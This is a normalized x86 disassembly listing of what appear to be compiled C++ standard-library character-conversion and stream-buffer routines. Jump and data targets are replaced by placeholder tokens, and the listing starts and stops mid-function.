pop ecx
sub_4c11e0
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov si [ ebp + 0x10 ]
push 0x0
push esi
push ebx
mov eax [ ebx ]
call [ eax + 0x2c ]
add esp 0xc
xor edx edx
mov dl al
mov ecx [ ebx + 0x10 ]
mov ax [ ecx + edx * 2 ]
and ax [ ebp + 0xc ]
setne al
and eax 0x1
pop esi
pop ebx
pop ebp
retn
sub_4c1214
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp ebx [ ebp + 0x10 ]
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov di [ ebx ]
push 0x0
push edi
push esi
mov eax [ esi ]
call [ eax + 0x2c ]
add esp 0xc
xor edx edx
mov dl al
mov ecx [ esi + 0x10 ]
mov ax [ ecx + edx * 2 ]
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
add ebx 0x2
add [ ebp + 0x14 ] 0x2
cmp ebx [ ebp + 0x10 ]
jne r-xdata
sub_4c1258
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
jmp r-xdata
cmp ebx [ ebp + 0x14 ]
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov di [ ebx ]
mov si [ ebp + 0xc ]
push edi
push esi
mov eax [ ebp + 0x8 ]
push eax
mov edx [ eax ]
call [ edx + 0x4 ]
add esp 0xc
test al al
je r-xdata
add ebx 0x2
sub_4c128c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
jmp r-xdata
cmp ebx [ ebp + 0x14 ]
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov di [ ebx ]
mov si [ ebp + 0xc ]
push edi
push esi
mov eax [ ebp + 0x8 ]
push eax
mov edx [ eax ]
call [ edx + 0x4 ]
add esp 0xc
test al al
jne r-xdata
add ebx 0x2
sub_4c12c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov ebx edi
push 0x0
push ebx
push esi
mov eax [ esi ]
call [ eax + 0x2c ]
add esp 0xc
mov ebx eax
test bl bl
jne r-xdata
lea edi [ esi + 0x8 ]
xor eax eax
mov al bl
mov [ ebp - 0x8 ] eax
mov edx [ edi ]
push edx
mov ecx [ ebp - 0x8 ]
and ecx 0xff
push ecx
call sub_4cbff4
add esp 0x8
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
push eax
push esi
mov edx [ esi ]
call [ edx + 0x24 ]
add esp 0x8
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4c1320
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp esi [ ebp + 0x10 ]
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov bx [ esi ]
push 0x0
push ebx
push edi
mov eax [ edi ]
call [ eax + 0x2c ]
add esp 0xc
mov ebx eax
test bl bl
je r-xdata
add esi 0x2
cmp esi [ ebp + 0x10 ]
jne r-xdata
lea edx [ edi + 0x8 ]
xor ecx ecx
mov [ ebp - 0x8 ] edx
mov cl bl
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
push edx
mov ecx [ ebp - 0xc ]
and ecx 0xff
push ecx
call sub_4cbff4
add esp 0x8
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
push eax
push edi
mov edx [ edi ]
call [ edx + 0x24 ]
add esp 0x8
mov [ esi ] ax
sub_4c1394
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov ebx edi
push 0x0
push ebx
push esi
mov eax [ esi ]
call [ eax + 0x2c ]
add esp 0xc
mov ebx eax
test bl bl
jne r-xdata
lea edi [ esi + 0x8 ]
xor eax eax
mov al bl
mov [ ebp - 0x8 ] eax
mov edx [ edi ]
push edx
mov ecx [ ebp - 0x8 ]
and ecx 0xff
push ecx
call sub_4cc098
add esp 0x8
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
push eax
push esi
mov edx [ esi ]
call [ edx + 0x24 ]
add esp 0x8
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4c13f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp esi [ ebp + 0x10 ]
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov bx [ esi ]
push 0x0
push ebx
push edi
mov eax [ edi ]
call [ eax + 0x2c ]
add esp 0xc
mov ebx eax
test bl bl
je r-xdata
add esi 0x2
cmp esi [ ebp + 0x10 ]
jne r-xdata
lea edx [ edi + 0x8 ]
xor ecx ecx
mov [ ebp - 0x8 ] edx
mov cl bl
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
push edx
mov ecx [ ebp - 0xc ]
and ecx 0xff
push ecx
call sub_4cc098
add esp 0x8
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
push eax
push edi
mov edx [ edi ]
call [ edx + 0x24 ]
add esp 0x8
mov [ esi ] ax
sub_4c1468
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx [ ebp + 0x8 ]
mov al [ ebp + 0xc ]
mov [ ebp - 0x1 ] al
xor edx edx
mov [ ebp - 0x8 ] edx
lea esi [ ebx + 0x18 ]
mov eax [ esi + 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
push edx
push 0x1
lea ecx [ ebp - 0x1 ]
push ecx
lea eax [ ebp - 0xa ]
push eax
call sub_4c39c0
add esp 0x14
test eax eax
jge r-xdata
mov ax [ ebp - 0xa ]
mov ax 0xffff
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4c14b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov ebx [ ebp + 0xc ]
cmp ebx [ ebp + 0x10 ]
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al [ ebx ]
xor edx edx
mov [ ebp - 0x1 ] al
mov [ ebp - 0x8 ] edx
mov esi [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
add esi 0x18
lea ecx [ ebp - 0x1 ]
mov eax [ esi + 0x4 ]
push eax
push edx
push 0x1
push ecx
lea eax [ ebp - 0xa ]
push eax
call sub_4c39c0
add esp 0x14
test eax eax
jge r-xdata
mov dx [ ebp - 0xa ]
mov dx 0xffff
jmp r-xdata
mov [ edi ] dx
inc ebx
add edi 0x2
cmp ebx [ ebp + 0x10 ]
jne r-xdata
sub_4c1514
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
lea ecx [ ebp - 0x4 ]
push ebx
push esi
push edi
mov di [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov bl [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
add esi 0x18
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0xa ]
push edx
push ecx
push edi
push eax
call sub_4c39f8
add esp 0x10
dec eax
je r-xdata
mov al [ ebp - 0xa ]
mov eax ebx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4c155c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
cmp esi [ ebp + 0x10 ]
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov di [ esi ]
mov bl [ ebp + 0x14 ]
xor eax eax
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
add edx 0x18
mov [ ebp - 0x8 ] edx
lea edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov eax [ ecx + 0x4 ]
lea ecx [ ebp - 0xa ]
push eax
push edx
push edi
push ecx
call sub_4c39f8
add esp 0x10
dec eax
jne r-xdata
mov eax [ ebp + 0x18 ]
mov [ eax ] bl
add esi 0x2
inc [ ebp + 0x18 ]
cmp esi [ ebp + 0x10 ]
jne r-xdata
mov bl [ ebp - 0xa ]
sub_4c15b8
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
call sub_4c517c
mov [ ebp - 0x8 ] 0x1
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ fs : 0x0 ] ecx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x14 ] 0xc
mov edx rw-data
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] edx
dec [ ebp - 0x8 ]
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_4b3018
add esp 0x8
test [ ebp + 0xc ] 0x1
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4b0180
pop ecx
sub_4c1624
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4c517c
test ebx ebx
je r-xdata
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx rw-data
mov [ ebx ] edx
push 0x3
mov ecx [ ebx + 0x3c ]
push ecx
call sub_4b2f24
add esp 0x8
test [ ebp + 0xc ] 0x1
je r-xdata
push ebx
call sub_4b0180
pop ecx
sub_4c16a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
push ebx
mov eax [ ebx ]
call [ eax + 0x18 ]
mov di 0xffff
mov esi eax
cmp si di
pop ecx
sete dl
and edx 0x1
test dl dl
je r-xdata
mov edx [ ebx + 0x24 ]
mov ecx [ edx ]
add [ edx ] 0x2
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
mov ax 0xffff
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4c16ec
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebx + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
xor esi esi
mov ecx [ ebx + 0x34 ]
mov eax [ ebx + 0x24 ]
mov esi [ ecx ]
sub esi [ eax ]
sar esi 0x1
jns r-xdata
push ebx
mov ecx [ ebx ]
call [ ecx + 0x1c ]
pop ecx
mov esi eax
mov [ ebp - 0xa ] 0xffff
cmp si [ ebp - 0xa ]
sete al
and eax 0x1
test al al
jne r-xdata
cmp esi edi
jle r-xdata
test esi esi
jle r-xdata
adc esi 0x0
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ edx ] si
add [ ebp + 0xc ] 0x2
inc [ ebp - 0x4 ]
dec edi
mov eax esi
mov edx [ ebx + 0x24 ]
mov edx [ edx ]
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
push eax
push edx
mov eax [ ebp - 0x8 ]
push eax
call sub_4c4cd4
mov eax esi
add esp 0xc
add eax eax
sub edi esi
add [ ebp + 0xc ] eax
add [ ebp - 0x4 ] esi
mov eax esi
mov edx [ ebx + 0x24 ]
add eax eax
add [ edx ] eax
jmp r-xdata
mov esi edi
test edi edi
jg r-xdata
sub_4c17a0
push ebp
mov ebp esp
add esp 0xfffffff4
xor eax eax
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebx + 0x28 ]
cmp [ edx ] 0x0
je r-xdata
xor esi esi
mov ecx [ ebx + 0x38 ]
mov eax [ ebx + 0x28 ]
mov esi [ ecx ]
sub esi [ eax ]
sar esi 0x1
jns r-xdata
mov ecx [ ebp + 0xc ]
mov ax [ ecx ]
push eax
push ebx
mov edx [ ebx ]
call [ edx + 0xc ]
add esp 0x8
mov esi eax
mov [ ebp - 0xa ] 0xffff
cmp si [ ebp - 0xa ]
sete cl
and ecx 0x1
test cl cl
jne r-xdata
cmp esi edi
jle r-xdata
test esi esi
jle r-xdata
adc esi 0x0
jmp r-xdata
add [ ebp + 0xc ] 0x2
inc [ ebp - 0x4 ]
dec edi
mov ecx [ ebx + 0x28 ]
mov edx [ ebp + 0xc ]
mov eax esi
mov ecx [ ecx ]
mov [ ebp - 0x8 ] ecx
push eax
push edx
mov eax [ ebp - 0x8 ]
push eax
call sub_4c4cd4
mov edx esi
mov eax esi
add edx edx
add eax eax
add [ ebp + 0xc ] edx
add [ ebp - 0x4 ] esi
add esp 0xc
mov edx [ ebx + 0x28 ]
sub edi esi
add [ edx ] eax
jmp r-xdata
mov esi edi
test edi edi
jg r-xdata
sub_4c1858
push ebp
mov ebp esp
mov eax [ rw-data ]
add esp 0xfffffff8
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov [ ecx ] edx
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ rw-data ]
mov [ ecx + 0x8 ] eax
mov eax ecx
mov edx [ rw-data ]
mov [ ecx + 0xc ] edx
pop ecx
pop ecx
pop ebp
retn
sub_4c1898
push ebp
mov ebp esp
mov eax [ rw-data ]
add esp 0xfffffff8
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov [ ecx ] edx
mov edx [ ebp - 0x4 ]
mov [ ecx + 0x4 ] edx
mov eax [ rw-data ]
mov [ ecx + 0x8 ] eax
mov eax ecx
mov edx [ rw-data ]
mov [ ecx + 0xc ] edx
pop ecx
pop ecx
pop ebp
retn
sub_4c18f0
push ebp
mov ebp esp
add esp 0xfffffea0
mov eax rw-data
push ebx
push esi
push edi
lea ebx [ ebp - 0x28 ]
mov esi [ ebp + 0x8 ]
call sub_4c517c
mov [ ebp - 0x4e ] 0xffff
mov dx [ ebp - 0x4e ]
cmp dx [ ebp + 0xc ]
sete cl
and ecx 0x1
test cl cl
je r-xdata
mov ecx [ esi + 0x28 ]
cmp [ ecx ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0xffff
je r-xdata
cmp [ esi + 0x50 ] 0x0
jne r-xdata
mov eax [ esi + 0x28 ]
mov ecx [ esi + 0x38 ]
mov edx [ eax ]
cmp edx [ ecx ]
jae r-xdata
xor eax eax
mov ax [ ebp + 0xc ]
jmp r-xdata
cmp [ esi + 0x40 ] 0x0
jne r-xdata
mov ax 0xffff
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov eax [ esi + 0x28 ]
mov edx [ eax ]
add [ eax ] 0x2
mov cx [ ebp + 0xc ]
mov [ edx ] cx
mov ax [ ebp + 0xc ]
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov [ ebp - 0x54 ] 0x8
mov cx [ ebp + 0xc ]
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x56 ] cx
mov [ ebp - 0x3c ] 0xc
push eax
call sub_408628
pop ecx
lea edx [ ebp - 0x70 ]
push edx
lea ecx [ ebx + 0x8 ]
push ecx
call sub_408650
add esp 0x8
mov eax 0xf
mov [ ebx + 0x24 ] eax
mov [ ebp - 0x71 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov ecx [ esi + 0x50 ]
mov [ ebp - 0x64 ] ecx
mov ax [ ebp + 0xc ]
mov [ ebp - 0x66 ] ax
mov edx [ ebp - 0x64 ]
push edx
mov cx [ ebp - 0x66 ]
push ecx
call sub_4c9ec8
add esp 0x8
cmp ax 0xffff
setne al
and eax 0x1
test al al
je r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov ax 0xffff
mov ax [ ebp + 0xc ]
jmp r-xdata
mov edx edi
dec edx
mov edx 0x1
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add edx eax
mov [ ebp - 0x78 ] edx
mov edx [ ebp - 0x78 ]
mov cl [ ebp - 0x71 ]
mov [ edx ] cl
lea eax [ ebx + 0x8 ]
push eax
call sub_408880
pop ecx
mov edi eax
cmp edi 0x1
ja r-xdata
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
cmp [ ebx + 0x24 ] 0x8
jae r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp edx 0x8
jae r-xdata
mov cl 0x1
test cl cl
je r-xdata
mov eax [ ebx + 0x20 ]
push eax
push 0x8
push ebx
call sub_408678
add esp 0xc
inc [ ebp - 0x30 ]
mov [ ebp - 0x3c ] 0x18
mov [ ebp - 0x79 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edi [ ebx + 0x10 ]
mov edi [ ebx + 0x10 ]
jmp r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x128 ] edi
mov eax [ ebp - 0x128 ]
add eax [ ebx + 0x20 ]
mov [ ebp - 0x8c ] eax
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov [ ebp - 0x80 ] eax
push 0x8
movsx edx [ ebp - 0x79 ]
push edx
mov ecx [ ebp - 0x80 ]
push ecx
call sub_4c4d44
add esp 0xc
mov [ ebp - 0x81 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
dec eax
je r-xdata
mov [ ebp - 0x90 ] edx
lea edx [ ebp - 0x60 ]
mov eax [ ebp - 0x90 ]
mov [ ebp - 0x138 ] eax
lea eax [ esi + 0x48 ]
mov ecx [ ebp - 0x138 ]
mov [ ebp - 0x94 ] ecx
mov [ ebp - 0x98 ] eax
push edx
lea edx [ ebp - 0x5c ]
mov ecx [ ebp - 0x8c ]
push ecx
lea ecx [ ebp - 0x54 ]
mov eax [ ebp - 0x94 ]
push eax
push edx
push ecx
lea eax [ ebp - 0x56 ]
push eax
mov edx [ ebp - 0x98 ]
push edx
mov ecx [ esi + 0x40 ]
push ecx
mov eax [ ecx ]
call [ eax + 0x14 ]
add esp 0x20
sub eax 0x2
jb r-xdata
mov edx 0x8
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0x88 ] eax
mov eax [ ebp - 0x88 ]
mov cl [ ebp - 0x81 ]
mov [ eax ] cl
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
mov cx [ ebp - 0x56 ]
mov edi [ esi + 0x50 ]
mov [ ebp - 0x106 ] cx
push edi
mov ax [ ebp - 0x106 ]
push eax
call sub_4c9ec8
add esp 0x8
cmp ax 0xffff
setne dl
and edx 0x1
test dl dl
je r-xdata
jmp r-xdata
mov [ esi + 0x46 ] 0x1
lea ecx [ ebp - 0x56 ]
cmp ecx [ ebp - 0x5c ]
je r-xdata
mov eax [ esi + 0x50 ]
push eax
push edi
push 0x1
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx eax
mov [ ebp - 0x148 ] edx
mov edi [ ebp - 0x60 ]
sub edi edx
mov [ ebp - 0x3c ] 0x18
test edi edi
jbe r-xdata
mov ax 0xffff
mov ax [ ebp + 0xc ]
jmp r-xdata
mov ax 0xffff
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
test edi edi
ja r-xdata
mov ax [ ebp + 0xc ]
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0x111 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0x10c ] edx
mov ecx [ ebp - 0x10c ]
mov [ ebp - 0x110 ] ecx
mov eax [ ebp - 0x110 ]
push eax
call sub_4b0180
pop ecx
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0x119 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov esi [ ebx + 0x10 ]
mov edi esi
push edi
call sub_4b0180
pop ecx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
cmp [ ebx + 0x20 ] 0x20
jae r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0xb5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0xb0 ] edx
mov ecx [ ebp - 0xb0 ]
mov [ ebp - 0xb4 ] ecx
mov eax [ ebp - 0xb4 ]
push eax
call sub_4b0180
pop ecx
mov ax 0xffff
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov [ ebp - 0x9c ] edx
mov eax [ ebp - 0x9c ]
mov [ ebp - 0x158 ] eax
mov ecx [ ebp - 0x158 ]
push ecx
call sub_4c6cac
add esp 0x10
cmp edi eax
je r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov ax 0xffff
push eax
dec [ ebp - 0x30 ]
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
or ecx 0xffffffff
sub ecx [ ebx + 0x20 ]
cmp ecx 0x8
ja r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0xa5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov edx [ ebx + 0x10 ]
mov [ ebp - 0xa0 ] edx
mov ecx [ ebp - 0xa0 ]
mov [ ebp - 0xa4 ] ecx
mov eax [ ebp - 0xa4 ]
push eax
call sub_4b0180
pop ecx
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x118 ] ecx
mov edx [ ebp - 0x118 ]
mov cl [ ebp - 0x111 ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x120 ] ecx
mov edx [ ebp - 0x120 ]
mov cl [ ebp - 0x119 ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov edx 0xf
mov [ ebx + 0x24 ] edx
mov [ ebp - 0xfd ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov esi [ ebx + 0x10 ]
mov edi esi
push edi
call sub_4b0180
pop ecx
mov eax [ ebx + 0x20 ]
lea edx [ ebx + 0x8 ]
add eax 0x8
mov [ ebp - 0xc0 ] eax
push edx
mov edi eax
call sub_408880
pop ecx
mov [ ebp - 0xc4 ] eax
cmp [ ebp - 0xc4 ] 0x1
ja r-xdata
push ebx
call sub_4bbca8
pop ecx
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xbc ] ecx
mov edx [ ebp - 0xbc ]
mov cl [ ebp - 0xb5 ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0xc4 ]
dec ecx
mov ecx 0x1
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0xac ] ecx
mov edx [ ebp - 0xac ]
mov cl [ ebp - 0xa5 ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
xor eax eax
mov [ ebx + 0x20 ] eax
add ecx eax
mov [ ebp - 0x104 ] ecx
mov edx [ ebp - 0x104 ]
mov cl [ ebp - 0xfd ]
mov [ edx ] cl
pop eax
mov edx [ ebp - 0x4c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
cmp edi [ ebx + 0x24 ]
jbe r-xdata
push ebx
call sub_4bbca8
pop ecx
cmp edi ecx
jbe r-xdata
test edi edi
jne r-xdata
mov eax [ ebx + 0x20 ]
push eax
push edi
push ebx
call sub_408678
add esp 0xc
jmp r-xdata
test edi edi
seta al
and eax 0x1
test al al
je r-xdata
mov [ ebp - 0xdd ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov [ ebp - 0xe5 ] 0x0
mov edx [ ebx + 0x20 ]
mov [ ebp - 0xec ] edx
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
lea eax [ ebx + 0x10 ]
mov eax [ ebx + 0x10 ]
jmp r-xdata
lea ecx [ ebx + 0x10 ]
mov ecx [ ebx + 0x10 ]
jmp r-xdata
xor edx edx
mov [ ebx + 0x20 ] edx
add eax edx
mov [ ebp - 0xe4 ] eax
mov eax [ ebp - 0xe4 ]
mov cl [ ebp - 0xdd ]
mov [ eax ] cl
lea edx [ ebx + 0x10 ]
mov edx [ ebx + 0x10 ]
jmp r-xdata
add ecx [ ebp - 0xec ]
mov [ ebp - 0xf0 ] ecx
push 0x8
movsx eax [ ebp - 0xe5 ]
push eax
mov edx [ ebp - 0xf0 ]
push edx
call sub_4c4d44
add esp 0xc
mov eax [ ebp - 0xc0 ]
mov [ ebp - 0xf4 ] eax
mov [ ebp - 0xf5 ] 0x0
cmp [ ebx + 0x24 ] 0x10
jb r-xdata
mov eax [ ebp - 0xf4 ]
mov [ ebx + 0x20 ] eax
add edx eax
mov [ ebp - 0xfc ] edx
mov edx [ ebp - 0xfc ]
mov cl [ ebp - 0xf5 ]
mov [ edx ] cl
jmp r-xdata
sub_4c2058
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp [ ebx + 0x50 ] 0x0
je r-xdata
mov edx [ ebx + 0x14 ]
cmp eax [ edx ]
jbe r-xdata
mov ax 0xffff
jmp r-xdata
mov ax 0xffff
cmp si ax
sete dl
and edx 0x1
test dl dl
je r-xdata
mov ax 0xffff
cmp si ax
sete cl
and ecx 0x1
test cl cl
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
sub [ eax ] 0x2
cmp si 0xffff
je r-xdata
mov eax [ ebx + 0x24 ]
mov edx [ eax ]
mov ax [ edx - 0x2 ]
cmp si ax
sete cl
and ecx 0x1
test cl cl
je r-xdata
mov edx [ ebx + 0x24 ]
mov ecx [ edx ]
lea eax [ ebx + 0x44 ]
cmp ecx eax
je r-xdata
mov edi [ ebx + 0x50 ]
mov [ ebp - 0x2 ] si
push edi
mov dx [ ebp - 0x2 ]
push edx
call sub_4c88d8
add esp 0x8
cmp ax 0xffff
setne cl
and ecx 0x1
test cl cl
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
jmp r-xdata
mov ax 0xffff
mov [ ebx + 0x44 ] si
lea ecx [ ebx + 0x44 ]
mov [ ebp - 0x8 ] ecx
mov edx ecx
mov ecx [ ebx + 0x14 ]
mov edi [ ebp - 0x8 ]
lea eax [ ebx + 0x46 ]
mov [ ecx ] edi
mov ecx [ ebx + 0x24 ]
mov [ ecx ] edx
mov edx [ ebx + 0x34 ]
mov [ edx ] eax
mov eax esi
jmp r-xdata
mov eax esi
jmp r-xdata
sub_4c2148
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
push ebx
mov ecx [ ebx ]
call [ ecx + 0x1c ]
mov di 0xffff
mov esi eax
cmp si di
pop ecx
sete al
and eax 0x1
test al al
je r-xdata
mov edx [ ebx + 0x34 ]
cmp eax [ edx ]
jae r-xdata
push esi
push ebx
mov edx [ ebx ]
call [ edx + 0x10 ]
add esp 0x8
mov eax esi
mov eax esi
jmp r-xdata
mov ax [ eax ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4c2198
push ebp
mov ebp esp
add esp 0xfffffe90
